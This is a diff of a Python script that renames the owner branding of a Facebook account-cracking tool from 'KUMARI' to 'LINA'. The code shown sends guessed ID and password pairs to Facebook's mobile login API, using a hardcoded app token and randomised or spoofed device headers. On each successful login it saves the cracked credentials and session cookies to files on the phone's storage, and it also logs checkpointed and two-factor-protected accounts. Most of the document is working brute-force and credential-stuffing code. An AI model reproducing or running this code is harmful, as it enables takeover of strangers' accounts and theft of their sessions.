@@ -11,7 +11,7 @@ try:
 except ModuleNotFoundError: 
     print('\n Installing missing modules ...')
     os.system('pip install requests bs4 futures==2 > /dev/null')
-    os.system('python KUMARI.py')
+    os.system('python LINA .py')
 	
 os.system('xdg-open https://m.facebook.com/100004036849283')
 
@@ -167,18 +167,22 @@ BLACK="\033[1;30m"
 EXTRA ='\x1b[38;5;208m'
 #________________________________________#
 
-logo=(f"""{WHITE}
-
-  \033[1;35m_  ___   _ __  __    _    ____  ___ 
-\033[1;35m | |/ / | | |  \/  |  / \  |  _ \|_ _|
-\033[1;31m | ' /| | | | |\/| | / _ \ | |_) || | 
- \033[1;34m| . \| |_| | |  | |/ ___ \|  _ < | | 
- \033[1;35m|_|\_\\___/|_|  |_/_/   \_\_| \_\___|
-
+logo=(f"""{WHITE}                                                                                                          
+____           ____      ___      ___             _      
+`MM'           `MM'      `MM\     `M'            dM.     
+ MM             MM        MMM\     M            ,MMb     
+ MM             MM        M\MM\    M            d'YM.    
+ MM             MM        M \MM\   M           ,P `Mb    
+ MM             MM        M  \MM\  M           d'  YM.   
+ MM             MM        M   \MM\ M          ,P   `Mb   
+ MM             MM        M    \MM\M          d'    YM.  
+ MM             MM        M     \MMM         ,MMMMMMMMb  
+ MM    /        MM        M      \MM         d'      YM. 
+_MMMMMMM       _MM_      _M_      \M       _dM_     _dMM_                                          
 \033[1;36m----------------------------------------------')                                                                    
-{WHITE}[•] OWNER        : KUMARI TRICKER
-{WHITE}[•] WhatsApp     :   0310****
-[•] FaceBook     :  KUMARI TRICKER
+{WHITE}[•] OWNER        : LINA KHAN 
+{WHITE}[•] WhatsApp     :   🥀🥀🥀
+[•] FaceBook     :  LINA LINA  
 [•] Version      :   {RED}1.0
 {WHITE}[•] TOOL STATUS. :  FREE  
 
@@ -315,7 +319,7 @@ def pak():
 def ffb(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [KUMARI-] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [LINA -] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -366,26 +370,26 @@ def ffb(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [-KUMARI-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [-LINA -OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/KUMARI-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/KUMARI-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/LINA -COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/LINA -OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[KUMARI-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[LINA -2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;31m [ALONE-KUMARI-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/KUMARI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[1;31m [ALONE-LINA -CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/LINA -CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/KUMARI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/LINA -CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -397,7 +401,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [KUMARI- ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [LINA - ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -489,23 +493,23 @@ def api(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [-KUMARI-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/KUMARI-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [-LINA -OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/LINA -OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[KUMARI-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[LINA -2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;31m [ALONE-KUMARI-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/KUMARI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[1;31m [ALONE-LINA -CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/LINA -CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/KUMARI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/LINA -CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -516,7 +520,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [KUMARI-] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [LINA -] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -589,11 +593,11 @@ def api1(ids,names,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [-KUMARI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [-LINA -OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/KUMARI-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/KUMARI-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/LINA -COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/LINA -rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -603,8 +607,8 @@ def api1(ids,names,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                    #    print('\r\r\x1b[1;31m [KUMARI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/KUMARI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                    #    print('\r\r\x1b[1;31m [LINA -CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/LINA -rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -615,7 +619,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [KUMARI-] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [LINA -] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -645,7 +649,7 @@ def rndm(ids,passlist):
                         mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua  = 'Dalvik/2.1.0 (Linux; U; Android 11; Infinix X695 Build/RP1A.200720.011) [FBAN/MobileAdsManagerAndroid;FBAV/343.0.0.27.117;FBBV/507988102;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2208};FB_FW/1;]'
+                        ua  = '[FBAN/FB4A;FBAV/47.0.0.4463;FBBV/6142759;[FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/com.facebook.katana;FBLC/hr_BA;FBBV/180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720height=1280};FB_FW/1;FBRV/181817659;] FBBK/1]'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -659,8 +663,8 @@ def rndm(ids,passlist):
                         li2 = random.choice(li)
                         j1 = ''.join(random.choice(digits) for _ in range(2))
                         jazoest = li2+j1
-                        data ={'adid': '6f13978e-a827-4d80-89fa-f8d1fae3934a', 'format': 'json', 'device_id': 'b8c9cc41-b3e2-4a7a-977f-57aa0bdade98', 'email': '03349966406', 'password': '9966406', 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': 'f9c579d7-7a5d-4334-b97c-827930752b0a', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '62f8ce9f74b12f84c123cc23437a4a32', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-                        headers={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; Infinix X695 Build/RP1A.200720.011) [FBAN/MobileAdsManagerAndroid;FBAV/343.0.0.27.117;FBBV/507988102;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2208};FB_FW/1;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '24141', 'X-FB-SIM-HNI': '39282', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
+                        data ={'adid': '8d07b6d0-52c5-431b-ab1d-52e0c67ab136', 'format': 'json', 'device_id': 'a654bc43-57ca-4830-9d36-fb594e89fcb1', 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': '55c8919c-a7db-4994-ae4c-1e4497aaf2a8', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'hr_BA', 'client_country_code': 'BA', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '62f8ce9f74b12f84c123cc23437a4a32', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+                        headers={'User-Agent': '[FBAN/FB4A;FBAV/47.0.0.4463;FBBV/6142759;[FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/com.facebook.katana;FBLC/hr_BA;FBBV/180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720height=1280};FB_FW/1;FBRV/181817659;] FBBK/1]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '26408', 'X-FB-SIM-HNI': '26059', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                         url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
@@ -672,11 +676,11 @@ def rndm(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [-KUMARI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [-LINA -OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/KUMARI-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/KUMARI-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/LINA -COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/LINA -OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -686,8 +690,8 @@ def rndm(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[1;31m [KUMARI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/KUMARI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[1;31m [LINA -CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/LINA -rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
